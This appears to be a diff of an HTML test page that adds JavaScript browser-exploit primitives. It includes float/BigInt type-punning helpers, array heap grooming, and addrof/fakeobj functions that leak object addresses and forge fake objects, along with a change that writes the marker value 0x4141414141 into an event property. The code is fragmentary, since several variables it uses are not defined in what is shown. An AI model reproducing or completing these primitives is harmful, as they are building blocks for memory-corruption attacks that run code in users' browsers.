@@ -2,6 +2,36 @@
 	<body></body>
 <pre id='log' style="font-size : 40px;"></pre>
 <script>
+	function float2bigint(v) {
+  f[0] = v;
+  return BigInt(u[0]) | (BigInt(u[1]) << 32n);
+}
+function bigint2float(v) {
+  u[0] = Number(v & 0xffffffffn);
+  u[1] = Number(v >> 32n);
+  return f[0];
+}
+let addrof = null
+let fakeobj = null;
+for (var i = 0; i < 100; i++) keep.push([1.1*i]);
+let a0 = [0,0,0,0,0,0,0,0,0,0];
+let a1 = [0,0,0,0,0,0,0,0,0,0];
+// transition to unboxed double storage
+a1[3] = 13.37;
+let b0 = [0,0,0,0,0,0,0,0,0,0];
+let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
+
+// put zeroes in first two slots so JSCallbackData destruction is safe
+delete b1[0];
+delete b1[1];
+addrof = (val) => {
+    b1[0] = val;
+    return float2bigint(a1[offset]);
+  }
+  fakeobj = (addr) => {
+    a1[offset] = bigint2float(addr);
+    return b1[0];
+  }
     function tohex(n) {
     if(n < 0) {
         n = 0xFFFFFFFF + n + 1;
@@ -103,14 +133,14 @@ setTimeout(() => {
                 alert(event.pointerId)
             }
         }
-        event.pointerId = new ArrayBuffer(4)
+        event.pointerId = 0x4141414141
         alert(tohex(event.pointerId))
         //g_arr_ab_1;
         
 
     
   });
-}, 0); // enough time for the style sheet to be cached
+}, 5); // enough time for the style sheet to be cached
 
 }
         main();
